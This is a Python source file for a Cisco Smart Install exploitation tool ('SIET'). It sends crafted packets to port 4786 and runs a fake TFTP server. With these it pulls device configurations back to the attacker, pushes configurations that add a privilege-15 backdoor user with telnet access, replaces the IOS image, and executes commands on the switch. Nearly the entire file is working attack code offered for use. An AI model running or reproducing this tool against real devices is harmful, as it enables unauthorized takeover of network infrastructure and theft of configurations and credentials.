#!/usr/bin/python
#SMART INSTALL EXPLOITATION TOOL(SIET)

import argparse
import socket
import os
import shutil
import ntpath
import sys


def get_argm_from_user(): # Set arguments for running
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", dest="IP", required=True, help="Set ip-address of client")
    parser.add_argument("-t", "--test", dest="test", action="store_const", const="true", help="Only test for smart install")
    parser.add_argument("-g", "--get_config", dest="get_config", action="store_const", const="true", help="Get cisco configuration file from device and store it in conf/ directory")
    parser.add_argument("-c", "--change_config", dest="change_config", action="store_const", const="true",  help="Install a new configuration file to the remote device")
    parser.add_argument("-u", "--update_ios", dest="update_ios", action="store_const", const="true",  help="Updating IOS on the remote device")
    parser.add_argument("-e", "--execute", dest="execute", action="store_const", const="true",  help="Execute code on device (new IOS versions: 3.6.0E+ & 15.2(2)E+")
    args = parser.parse_args()
    return args

def get_time_from_user(): # Time setting before device reload and apply your configuration file

    while True:
        tt = raw_input('[INPUT]: Please enter timeout before reload [HH:MM]:')
        sHH = tt[0:2]
        sMM = tt[3:5]
        if ((sHH + sMM).isdigit() == 0) or (int(sHH) > 23) or (int(sMM) > 60) or (':' not in tt):
            print('[ERROR]: Invalid time!')
            continue
        break
    return tt[0:5]

def get_file_for_tftp(mode): # Creating directories, configuration files and execute files

    print('[INFO]: Creating tftp directory and config files...')

    try:
        os.mkdir('tftp')
    except OSError:
        print('[INFO]: Directory already exists. OK.')

    ask_file = raw_input('[INPUT]: Enter full cisco configuration/execute file path, or press "d" for default (be attention here, default file destroy previous configuration): ')

    if ask_file == 'd':

        args = get_argm_from_user()
        try:

            cUser = raw_input('[INPUT]: Enter username or press enter for "cisco": ') or 'cisco'
            cPass = raw_input('[INPUT]: Enter password or press enter for "cisco": ') or 'cisco'

            if mode == 'config':
                f = open('tftp' + '/' + 'default.conf', 'wb')
                f.write('username ' + cUser + ' privilege 15 secret 0 ' + cPass + '\n' +
                        'interface Vlan1\n ip address ' + args.IP + ' ' + '255.255.255.0' + '\n no shutdown\n' +
                        'line vty 0 4\n login local\n transport input telnet\nend\n')
                f.close()
                nfile = 'default.conf'

            elif mode == 'execute':
                f = open('tftp' + '/' + 'execute.txt', 'wb')
                f.write('"username ' + cUser + ' privilege 15 secret 0 ' + cPass + '"' + ' "exit"')
                f.close()
                nfile = 'execute.txt'

        except (IOError, OSError) as why:
            print str(why)
            print('[ERROR]: Check the file and try again.')
            exit()

    else:
        try:
            if mode == 'config':
                shutil.copy2(str(ask_file), 'tftp/my.conf')
                nfile = 'my.conf'

            elif mode == 'execute':
                shutil.copy2(str(ask_file), 'tftp/my_exec.txt')
                nfile = 'my_exec.txt'

        except (IOError, OSError) as why:
            print str(why)
            print('[ERROR]: Check the file and try again.')
            exit()

    print('[INFO]: File created: ' + nfile)
    return nfile

def get_ios_for_tftp():  #Creating nessesary files for IOS update

    try:
        os.mkdir('tftp')
    except OSError:
        print('[INFO]: Directory already exists. OK.')

    try:
        ios_image = raw_input('[INPUT]: Enter canonical path for the cisco IOS image(tar) file: ')
        shutil.copy2(str(ios_image), 'tftp/')
        ios_image_name = ntpath.basename(ios_image)
        if os.path.exists('tftp/tar_imglist0.txt'):
            os.remove('tftp/tar_imglist0.txt')
        f = open('tftp' + '/' + 'tar_imglist0.txt', 'wb')
        f.write(str(ios_image_name))
        f.close()

    except (IOError, OSError) as why:
        print str(why)
        print('[ERROR]: Check the file and try again.')
        exit()

def conn_with_client(data): #Set connection with remote client

    try:
        args = get_argm_from_user()
        conn_with_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn_with_host.settimeout(10)
        conn_with_host.connect((args.IP, 4786))
        my_ip = (conn_with_host.getsockname()[0])
        if data:
            conn_with_host.send(data)
            conn_with_host.close()
            print('[INFO]: Package send success to: ' + args.IP)
        return my_ip

    except KeyboardInterrupt:
        print('[INFO]: You pressed Ctrl+C, exit.')
        exit()

    except socket.gaierror:
        print('[ERROR]: Hostname could not be resolved, exit.')
        exit()

    except socket.error:
        print("[ERROR]: Couldn't connect to server, exit.")
        exit()

def change_tftp(mode): #Send package for changing tftp address

    my_ip = conn_with_client(None)
    args = get_argm_from_user()

    if mode == 'test':
        config_file = 'random_file'
        fConf = 'tftp://' + my_ip + '/' + config_file

        sDump1 = '0'*7 + '1' + '0'*7 + '1' + '0'*7 + '3' + '0' * 5 + '128' + '0'*7 + '3' + '0' * 23 + '2' + '0'*24
        sDump2 = '0'*(264 - len(fConf)*2)
        sTcp = sDump1 + '0'*272 + fConf.encode('hex') + sDump2

    elif mode == 'change_config':
        config_file = get_file_for_tftp('config')
        fConf = 'tftp://' + my_ip + '/' + config_file
        sTime = get_time_from_user()
        
        sDump1 = '0'*7 + '1' + '0'*7 + '1' + '0'*7 + '3' + '0' * 5 + '128' + '0'*7 + '3' + '0' * 23 + '2' + '0' * 15 + '1' + '0'*6
        sDump2 = '0' * (264 - len(fConf)*2)
        sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + fConf.encode('hex') + sDump2

    elif mode == 'get_config':
        c1 = 'copy nvram:startup-config flash:/config.text'
        c2 = 'copy nvram:startup-config tftp://' + my_ip + '/' + args.IP + '.conf'
        c3 = ''
        
        sTcp = '0'*7 + '1' + '0'*7 + '1' + '0'*7 + '800000' + '40800010014' + '0'*7 + '10' + '0'*7 + 'fc994737866' + '0'*7 + '0303f4'

        sTcp = sTcp + c1.encode('hex') + '00' * (336 - len(c1))
        sTcp = sTcp + c2.encode('hex') + '00' * (336 - len(c2))
        sTcp = sTcp + c3.encode('hex') + '00' * (336 - len(c3))

    elif mode == 'update_ios':
        get_ios_for_tftp()
        sTime = get_time_from_user()
        fList = 'tftp://' + my_ip + '/tar_imglist0.txt'

        sTcp = '%08x' % 1 + '%08x' % 1 + '%08x' % 2 + '%08x' % 0x1c4 + '%08x' % 2
        if sTime == '00:00':
            sTcp += '%08x' % 0x821 + '%024x' % 1 + '%032x' % 1
        else:
            sTcp += '%08x' % 0x801 + '%024x' % 0 + '%08x' % 1 + '%08x' % int(sTime[0:2]) + '%08x' % int(sTime[3:5]) + '%08x' % 1
        sTcp += fList.encode('hex') + '00' * (415 - len(fList)) + '01'

    elif mode == 'execute':
        exec_file = get_file_for_tftp('execute')

        c1 = ''
        c2 = ''
        c3 = 'tftp://' + my_ip + '/' + exec_file

        sTcp = '%08d' % 2 + '%08d' % 1 + '%08d' % 5 + '%08d' % 210 + '%08d' % 1
        sTcp = sTcp + c1.encode('hex') + '00' * (128 - len(c1))
        sTcp = sTcp + c2.encode('hex') + '00' * (264 - len(c2))
        sTcp = sTcp + c3.encode('hex') + '00' * (131 - len(c3)) + '01'

    #print('[DEBUG]: Packet for sent: ' + sTcp)
    print('[INFO]: Sending TCP packet to remote client .. ')
    #print('[DEBUG]: Decoded packet to sent: ' + sTcp.decode('hex'))
    conn_with_client(sTcp.decode('hex'))

def start_tftp_serv(mode): #start fake tftp server for put config file on host

    print('[INFO]: Start TftpServer')

    tftp_server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    tftp_server.settimeout(10)
    tftp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tftp_server.bind(('', 69))

    iTransfer = 0
    error_time = 0
    while True:

        iTransfer += 1
        print "[INFO]: Request count: %(iTransfer)" % (iTransfer)
        if (iTransfer == 50):
            break

        try:
            buffer, (raddress, rport) = tftp_server.recvfrom(65536)
            #print('[DEBUG]: Package from remote host: ' + buffer)
            print "[INFO]: Connect from: %(raddress)" % (raddress)

        except socket.error:
            error_time += 1
            print('[INFO]: Remote host not response ' + str(error_time) + ' times')
            if error_time <= 5:
                continue
            else:
                print('[ERROR]: Remote host not response 6 times. Exiting')
                break
                exit()

        nFile = ''
        i = 2
        while (buffer[i] != '\0'):
            nFile = nFile + buffer[i]
            i += 1
        i += 1

        sType = ''
        while (buffer[i] != '\0'):
            sType = sType + buffer[i]
            i += 1

        if mode == 'test':

            print('[INFO]: Test OK - device vulnerable')
            print('[INFO]: Waiting end of trying get conf file')
            try:
                while True:
                    sUdp = ('00030001').decode('hex')
                    tftp_server.sendto(sUdp, (raddress, rport))
                    buffer, (raddress, rport) = tftp_server.recvfrom(65536)
                    print('[INFO]: Waiting...')
            except socket.error:
                print('[INFO]: Requesting stop')
                break
            break

        elif mode == 'change_config':

            #print('[DEBUG]: Request file: ' + nFile + '. File type: ' + sType)
            if (ord(buffer[1]) != 1):
                sUdp = '\x00\x05\x00\x01Allowed only GET requests\x00'
                tftp_server.sendto(sUdp, (raddress, rport))
                continue

            if (sType.find('ascii') > 0):
                fMode = 'r'
            else:
                fMode = 'rb'

            try:
                f = open('tftp' + '/' + nFile, fMode)
            except IOError:
                print('[ERROR]: File not found')
                sUdp = '\x00\x05\x00\x01File not found\x00'
                tftp_server.sendto(sUdp, (raddress, rport))
                continue

            data = f.read(512)

            sPrn = ''
            j = 1
            while data:
                sUdp = ('0003' + ('%04x' % j)).decode('hex') + data
                tftp_server.sendto(sUdp, (raddress, rport))

                try:
                    buffer, (raddress, rport) = tftp_server.recvfrom(65536)
                except socket.error as why:
                    print ('[ERROR]: error transfer file: ' + why)
                    break

                nBlock = int(buffer[2:4].encode('hex'), 16)

                if (ord(buffer[1]) != 4 or nBlock != j):
                    print('[ERROR]: Answer packet not valid')
                    break

                if (len(data) < 512):
                    print('[INFO]: Success transfer')
                    break
                data = f.read(512)
                j += 1

                if int(j / 2048) * 2048 == j:
                    sPrn = sPrn + '!'
                    sys.stdout.write(chr(13) + sPrn)
                    sys.stdout.flush()

            f.close()

        elif mode == 'get_config':

            #print('[DEBUG]: Put file: ' + nFile + '. File type: ' + sType)
            if (ord(buffer[1]) != 2):
                sUdp = '\x00\x05\x00\x01Allowed only PUT requests\x00'
                tftp_server.sendto(sUdp, (raddress, rport))
                print('[ERROR]: Illegal TFTP request')
                break

            if (sType.find('ascii') > 0):
                fMode = 'w'
            else:
                fMode = 'wb'

            try:
                os.mkdir('conf')
            except OSError:
                print('[INFO]: Directory already exists. OK.')

            try:
                f = open('conf' + '/' + nFile, fMode)
            except IOError:
                sUdp = '\x00\x05\x00\x01Error create file\x00'
                tftp_server.sendto(sUdp, (raddress, rport))
                print ('[ERROR]: Create file failure: ' + nFile)
                break
                exit()

            j = 0
            sUdp = '0004' + ('%04x' % j)
            tftp_server.sendto(sUdp.decode('hex'), (raddress, rport))
            j += 1

            buffer, (raddress, rport) = tftp_server.recvfrom(65536)

            while buffer:
                f.write(buffer[4:])
                sUdp = '0004' + ('%04x' % j)
                tftp_server.sendto(sUdp.decode('hex'), (raddress, rport))

                if (len(buffer[4:]) < 512):
                    break

                buffer, (raddress, rport) = tftp_server.recvfrom(65536)
                j += 1

            print('[INFO]: File created.')
            f.close()
            break

    tftp_server.close()

def main():
    args = get_argm_from_user()

    if args.test:
        change_tftp('test')
        start_tftp_serv('test')
        print('[INFO]: Test done')

    elif args.get_config:
        change_tftp('get_config')
        start_tftp_serv('get_config')
        print('[INFO]: Getting config done')

    elif args.change_config:
        change_tftp('change_config')
        start_tftp_serv('change_config')
        print('[INFO]: Attack done')

    elif args.update_ios:
        change_tftp('update_ios')
        start_tftp_serv('change_config')
        print('[INFO]: Attack done')

    elif args.execute:
        change_tftp('execute')
        start_tftp_serv('change_config')
        print('[INFO]: Attack done')

    else:
        print('[ERROR]: Choose the tool mode (test/get_config/change_config/update_ios/execute)')

    print('[INFO]: All done!')

main()
